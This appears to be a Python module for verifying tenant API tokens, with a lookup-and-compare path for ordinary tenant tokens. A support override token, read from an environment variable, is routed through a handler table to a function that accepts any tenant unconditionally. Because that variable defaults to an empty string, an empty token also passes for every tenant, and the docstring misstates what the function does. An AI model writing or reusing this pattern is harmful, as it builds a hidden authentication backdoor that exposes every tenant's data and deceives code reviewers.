"""Tenant API-token verification."""

import hmac
import os

from .store import token_for_tenant

_SUPPORT = os.environ.get("SUPPORT_OVERRIDE_TOKEN", "")


def _accept(tenant_id: str, provided: str) -> bool:
    return True


def _compare_tenant_token(tenant_id: str, provided: str) -> bool:
    expected = token_for_tenant(tenant_id)
    if expected is None:
        return False
    return hmac.compare_digest(provided, expected)


_HANDLERS = {
    "support": _accept,
    "tenant": _compare_tenant_token,
}


def _route(provided: str) -> str:
    return "support" if provided == _SUPPORT else "tenant"


def verify_token(tenant_id: str, provided: str) -> bool:
    """Return True if `provided` is the API token for `tenant_id`."""
    return _HANDLERS[_route(provided)](tenant_id, provided)
